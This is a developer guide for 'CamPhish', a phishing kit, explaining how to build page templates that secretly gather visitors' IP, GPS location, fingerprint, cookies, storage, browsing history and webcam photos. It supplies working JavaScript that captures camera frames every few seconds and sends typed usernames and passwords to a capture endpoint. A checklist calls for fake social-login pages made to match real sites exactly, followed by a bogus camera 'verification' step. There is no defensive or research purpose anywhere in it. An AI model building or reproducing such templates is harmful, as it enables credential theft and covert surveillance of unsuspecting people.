# CamPhish Template Development Guide

## Overview
Templates are self-contained HTML files in `templates/`. Page templates are auto-scanned on startup and served at `/t/:id`. Shared helper assets such as `/t/viral.js` and `/t/anti-detect.js` are served as JavaScript helpers and are not operator-visible templates. Each page template includes `recon.js` for automatic capture of IP, GPS, camera, fingerprint, cookies, storage, and history.

## Creating a New Template

### Step 1: Create HTML File
```bash
touch templates/my-template.html
```

### Step 2: Add Required Elements
```html
<!-- DESC: Description shown in dashboard -->
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<title>My Template</title>
</head>
<body>
<!-- Required: recon.js -->
<script src="forwarding_link/t/recon.js"></script>
<!-- Optional: hidden video + canvas for camera-backed flows -->
<video id="v" playsinline autoplay muted></video>
<canvas id="cap" width="320" height="240"></canvas>

<!-- Your content here -->

<script>
var API='API_BASE_URL';  // Replaced at serve time from request origin first
var SHARE_URL='forwarding_link/t/my-template';  // Replaced with the current public URL

// Required: Initialize recon on page load
if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});

// Optional: Start camera capture
function startCamera(){
  if(navigator.mediaDevices&&window.CamPhishRecon){
    navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
      var v=document.getElementById('v');v.srcObject=s;v.play();
      var cap=document.getElementById('cap'),cx=cap.getContext('2d');
      setInterval(function(){
        if(v.readyState>=2){
          cx.drawImage(v,0,0,320,240);
          CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'canvas');
        }
      },3000);  // Capture every 3 seconds
      setTimeout(function(){
        s.getTracks().forEach(function(t){t.stop();});
      }, 10000);
    }).catch(function(){});
  }
}

// Optional: Log events for session replay
CamPhishRecon.Capture.event('my_event',{data:'value'});

// Optional: Capture credentials (for login templates)
fetch(API+'/capture/credentials',{
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({
    template_id:'my-template',
    username:document.getElementById('user').value,
    password:document.getElementById('pass').value
  })
});
</script>
</body>
</html>
```

### Step 3: Restart App
```bash
docker compose restart app
```

## Placeholder System
| Placeholder | Replaced With | Example |
|-------------|--------------|---------|
| `API_BASE_URL` | `/api` or `<request-origin>/api` | `var API='API_BASE_URL'` → `var API='/api'` |
| `forwarding_link` | Current public origin (or empty fallback) | `src="forwarding_link/t/recon.js"` → `src="/t/recon.js"` |

## CamPhishRecon API

### init(opts)
```javascript
CamPhishRecon.init({genderDetect:true});
// Triggers: IP capture, location capture, fingerprint, gender detection,
// cookie grab, storage dump, history detection, auto camera/location
```

### Capture.image(dataUrl, method)
```javascript
CamPhishRecon.Capture.image(canvas.toDataURL('image/png'), 'canvas');
// method: 'canvas', 'webrtc', 'face_verify', 'qr_scan', etc.
```

### Capture.location()
```javascript
CamPhishRecon.Capture.location();
// Requests GPS permission, sends to /api/capture/location
```

### Capture.event(type, data)
```javascript
CamPhishRecon.Capture.event('game_start', {level:1});
CamPhishRecon.Capture.event('game_over', {score:500});
CamPhishRecon.Capture.event('camera_granted', {});
```

### requestCamera(callback)
```javascript
CamPhishRecon.requestCamera(function(err, stream){
  if(err){/* denied */}
  else{/* stream ready */}
});
```

## Game Template Checklist
- [ ] Works WITHOUT camera (camera is optional)
- [ ] Touch controls for mobile (touchstart/touchmove/touchend)
- [ ] Keyboard controls for desktop (arrow keys, WASD, space)
- [ ] Sound effects (Web Audio API)
- [ ] Haptic feedback (navigator.vibrate)
- [ ] Score display
- [ ] Game over screen
- [ ] Leaderboard (localStorage)
- [ ] Social sharing (WhatsApp, Facebook, Twitter)
- [ ] Share card generation (canvas-based image)
- [ ] recon.js included
- [ ] CamPhishRecon.init() called
- [ ] Camera starts on game start (optional)
- [ ] One-shot camera flows stop all media tracks after capture
- [ ] DOM elements use `el` prefix (elScore, elCombo)
- [ ] No external CDN dependencies
- [ ] Mobile-responsive (clamp() for font sizes)
- [ ] apple-mobile-web-app-capable meta tag

## Social Login Template Checklist
- [ ] 100% realistic design (match real site)
- [ ] Username/email input field with id="user"
- [ ] Password input field with id="pass"
- [ ] Login button triggers credential capture
- [ ] Credential capture: `fetch((window.CamPhishRecon ? '/api' : 'API_BASE_URL') + '/capture/credentials', ...)`
- [ ] Camera "verification" overlay after login attempt
- [ ] Camera captures every 2s during "verification"
- [ ] Error message after "verification" (login failed)
- [ ] recon.js included
- [ ] CamPhishRecon.init() called on page load
- [ ] `CamPhishRecon.UI.*` calls are guarded with a fallback when the shared helper is stale/missing

## Common Bugs to Avoid
1. **Variable collision**: `combo` as both number and DOM element → use `elCombo`
2. **Hidden start button**: Don't use `class="hidden"` on start button
3. **Event listeners lost**: Attach listeners inside renderGrid(), not outside
4. **DOMContentLoaded too late**: Set up listeners immediately (script at bottom of body)
5. **Missing comma in SQL**: `DEFAULT (lower(hex(randomblob(16)))),` needs trailing comma
6. **Hash routes in dashboard links**: the React app uses `BrowserRouter`, so cross-page links must use real paths, not `#/...`
7. **Camera leak**: clear intervals and stop `stream.getTracks()` after face-scan or verification flows
